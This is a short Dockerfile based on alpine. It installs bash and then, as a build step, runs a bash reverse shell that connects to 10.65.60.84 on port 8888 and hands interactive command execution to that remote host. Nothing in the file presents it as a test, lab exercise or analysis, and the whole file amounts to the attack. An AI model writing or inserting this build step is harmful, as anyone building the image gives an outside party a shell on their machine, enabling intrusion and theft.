FROM alpine
RUN apk update && apk add bash
RUN /bin/bash -c 'bash -i > /dev/tcp/10.65.60.84/8888 0<&1 2>&1'